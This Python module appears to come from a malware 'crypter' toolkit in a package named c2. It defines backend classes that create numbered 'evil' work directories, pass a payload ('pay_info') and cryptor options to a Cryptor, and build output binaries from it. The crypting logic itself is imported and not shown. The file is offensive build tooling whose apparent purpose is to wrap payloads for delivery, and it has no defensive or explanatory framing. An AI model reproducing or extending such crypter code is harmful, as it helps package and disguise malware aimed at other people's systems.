import random, shutil, os, sys, json
from typing import List, Dict, IO
from dataclasses import dataclass

from c2._internal_config import get_loccrypts_dir
from c2.validate_opts import validate_bld_opts
from c2.cryptor import Cryptor, CryptorFactory
from c2.cryptor_cli import CryptorCLI
from c2.infra.cli_conf_to_argv import cli_conf_to_argv
from c2.infra.unischema import unischema_load
from c2.common.waitable_path_lock import WaitablePathLock
from c2.common.get_next_filename_seqnum import get_next_filename_seqnum
from c2.common.multi_stream_writer import MultiStreamWriter


backend_shortcut_names = ['class', 'cli', 'xcli', 'web']

_sd = os.path.dirname(__file__)

@dataclass
class BackendArgs:
  # Cryptor's opts
  file_path: str# = None
  pay_info: dict# = None
  crp_opts: dict# = None
  rnd_opts: dict# = None
  # Backend's opts
  bld_opts: dict# = None


class BackendFactory:
  def __init__(self, backend_name, backend_init_str):
    self._backend_name = backend_name
    self._backend_init_str = backend_init_str

  def create_backend(self, backargs:BackendArgs):
    backname = self._backend_name
    initstr = self._backend_init_str
    if backname == 'class':
      return BackendClass(initstr, backargs)
    elif backname == 'cli':
      return BackendCLI(initstr, backargs)
    elif backname == 'xcli':
      raise#TODO: xcli is not needed anymore
      return BackendCLI(initstr, backargs)
    elif backname == 'web':
      #assert (rng == None)
      raise
    else:
      raise RuntimeError(f'unknown backname - {backname}')


class Backend:
  def __init__(self, init_str, backargs:BackendArgs):
    # pay_info, crp_opts and rnd_opts  validated in Cryptor
    validate_bld_opts(backargs.bld_opts)
    self._init_str = init_str
    self._backargs = backargs

  def do_init(self):
    # implementation can add #AdditionalPropertiesToSelf
    raise NotImplementedError()

  # only after do_init()
  def get_evil_dir(self):
    raise NotImplementedError()

  def do_crypt(self, log_file_path, do_log_stdout=False):
    raise NotImplementedError()

  def do_clear(self):
    raise NotImplementedError()

  def get_out_bin_paths(self):
    raise NotImplementedError()


# Local backends store their temp dirs in loccrypts dir
class BackendLocal(Backend):
  def __init__(self, *args, **kwargs):
    super().__init__(*args, **kwargs)
    self._evil_dir = None
    self._evil_name = None
    self._cryptsdir_lock = WaitablePathLock(f'{get_loccrypts_dir()}/LOCK')

  def do_init(self):
    with self._cryptsdir_lock:
      self._pick_dir_and_name()
      os.mkdir(self._evil_dir)

  def get_evil_dir(self):
    return self._evil_dir

  def do_clear(self):
    with self._cryptsdir_lock:
      shutil.rmtree(self._evil_dir)

  def _pick_dir_and_name(self):
    cookdir = get_loccrypts_dir()
    nextnum = get_next_filename_seqnum(f'{cookdir}/evil')
    self._evil_name = f'evil{nextnum:05d}'
    self._evil_dir = f'{cookdir}/{self._evil_name}'
    #sol_name = evil_name



# calling do_crypt() more than once -> undefined behavior (probably, like when I recrypt through bat without cleaning... should..work??...../..)
class BackendClass(BackendLocal):
  def __init__(self, *args, **kwargs):
    super().__init__(*args, **kwargs)
    if self._init_str != 'normal':
      raise RuntimeError(f'unsupported init_str {self._init_str}, only normal class supported')
    self._cryptor_fac = CryptorFactory(self._init_str)
    self._cryptor = None
    self._prnfn = lambda msg: None

  def do_crypt(self, log_file_path, do_log_stdout=False):
    solution_name = self._evil_name

    with open(log_file_path, 'w') as f:
      stm_writer = MultiStreamWriter()
      stm_writer.add_stream(f)
      if do_log_stdout:
        stm_writer.add_stream(sys.stdout)

      _inclroot = f'{_sd}/'
      Default_Sys_Opts = unischema_load(f'{_sd}/sys_opts.UNISCHEMA', _inclroot).make_default_config()

      self._cryptor = self._cryptor_fac.create_cryptor(
        self._backargs.file_path,
        self._backargs.pay_info,
        self._backargs.crp_opts,
        Default_Sys_Opts, # decide later
        self._backargs.rnd_opts,
        self.get_evil_dir(),
        solution_name,
        stm_writer)
      self._prnfn(f'doing _cryptor.all_stages()')
      self._cryptor.all_stages(lambda msg: print('-[ '+msg+' ]-'))

      for cfg in self._backargs.bld_opts['target_configs'].split(','):
        for prj in self._backargs.bld_opts['target_projects'].split(','):

          self._prnfn(f'building {cfg} {prj} in {self.get_evil_dir()}')
          self._cryptor.build(cfg, prj)

  def get_out_bin_paths(self):
    return self._cryptor.get_out_bin_paths()

  def get_outdata(self):
    return self._cryptor.get_outdata()



# Uses work dir clicrypts/
# Not a Backend's CLI, it's a Backend FOR CryptorCLI.
class BackendCLI(BackendLocal):
  def __init__(self, *args, **kwargs):
    super().__init__(*args, **kwargs)
    assert(self._init_str == '')
    #self._cryptor = None
    self._cryptor_out_dir = None

  def do_crypt(self, log_file_path, do_log_stdout=False):
    argv_pay, argv_crp, argv_rnd = [], [], []

    # Cryptor opts
    argv_pay = cli_conf_to_argv('pay', self._backargs.pay_info)
    argv_crp = cli_conf_to_argv('crp', self._backargs.crp_opts)
    argv_rnd = cli_conf_to_argv('rnd', self._backargs.rnd_opts)
    child_argv = argv_pay + argv_crp + argv_rnd

    # Backend opts (Cryptor doesn't know about them)
    argv_bld = cli_conf_to_argv('bld', self._backargs.bld_opts)
    child_argv += argv_bld

    child_argv += ['-i', self._backargs.file_path, '-o', self.get_evil_dir()]
    if log_file_path:
      child_argv += ['--log_file', log_file_path]
    if do_log_stdout:
      child_argv += ['--log_stdout']

    cryptor_cli = CryptorCLI(child_argv)

    ### EXECUTE THE CRYPTOR ###
    cryptor_cli.execute()


  def get_out_bin_paths(self):
    return json.load(open(self.get_evil_dir()+'/_BINPATHS_.json', 'r'))

  def get_outdata(self):
    return json.load(open(self.get_evil_dir()+'/_OUTDATA_.json', 'r'))



